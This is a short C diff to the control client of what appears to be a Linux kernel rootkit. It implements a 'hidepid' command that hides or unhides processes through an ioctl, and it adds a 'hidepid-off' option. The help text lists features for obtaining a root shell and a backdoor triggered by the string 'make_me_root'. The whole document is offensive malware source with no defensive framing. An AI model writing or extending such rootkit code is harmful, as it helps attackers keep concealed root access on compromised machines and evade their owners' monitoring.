@@ -69,9 +69,23 @@ parse_input(int argc, char **argv)
             return (cmd_t){ handle_togglebd, (void *)0 };
 
     if (ARGVCMP(1, "hidepid")) {
-        ASSERT_ARGC(3, "hidepid <add | remove> <PID>");
-        // TODO: return hidepid handle
+        ASSERT_ARGC(3, "hidepid <add | rm> <PID>");
+
+        long arg;
+        if ((arg = strtol(argv[3], NULL, 10))) {
+            if (ARGVCMP(2, "add"))
+                return (cmd_t){ handle_hidepid, (void *)(arg) };
+
+            if (ARGVCMP(2, "rm"))
+                return (cmd_t){ handle_hidepid, (void *)((-1) * (arg)) };
+        } else {
+            fprintf(stderr, "%s: invalid pid `%s`\n", progname, argv[3]);
+            exit(1);
+        }
     }
+
+    if (ARGVCMP(1, "hidepid-off"))
+            return (cmd_t){ handle_hidepid, (void *)0 };
 
     help();
     exit(1);
@@ -122,6 +136,7 @@ handle_togglebd(void *arg)
 int
 handle_hidepid(void *arg)
 {
+    return issue_ioctl(G7_HIDEPID, (const char *)arg);
 }
 
 int
@@ -154,5 +169,5 @@ help()
     printf("%-32s %s\n", "shell", "obtain a shell as root");
     printf("%-32s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or tty (1)");
     printf("%-32s %s\n", "backdoor-off", "disable any (read or tty) backdoor");
-    printf("%-32s %s\n", "hidepid <add | remove> <PID>", "{,un}hide a process");
+    printf("%-32s %s\n", "hidepid <add | rm> <PID>", "{,un}hide a process");
 }
